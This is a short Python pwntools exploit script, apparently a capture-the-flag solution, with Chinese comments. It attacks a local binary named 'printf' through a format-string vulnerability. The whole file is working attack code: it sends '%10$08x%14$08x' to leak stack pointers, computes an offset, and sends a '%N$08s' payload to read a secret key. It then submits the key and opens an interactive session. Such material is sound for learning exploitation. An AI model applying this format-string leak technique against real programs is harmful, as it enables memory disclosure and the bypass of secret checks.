#!/bin/python
# coding:utf-8 

from pwn import *

p = process('./printf')

# 获取vuln函数的esp和main函数的ebp
print p.recvuntil('(1)\n')
p.sendline('%10$08x%14$08x')

esp = int(p.recv(8),16) - 0x20
ebp = int(p.recv(8),16)

# key地址在栈里的位置偏移量
off = (ebp - esp - 36) / 4

# 用%s泄露出key的值, 有可能会失败, 比如key表示为16进制中恰好有一个字节为\0
print p.recvuntil('(2)\n')
p.sendline('%{}$08s\n\x00'.format(off))

# 打印key的值
key = u64(p.recv(8))
print 'key = {}'.format(key)

# 后面两次循环没用了
_ = p.recvuntil('(3)\n')
p.send('\n\x00')
_ = p.recvuntil('(4)\n')
p.send('\n\x00')

# 发送key
print p.recvuntil(': \n')
p.sendline(str(key))

p.interactive()
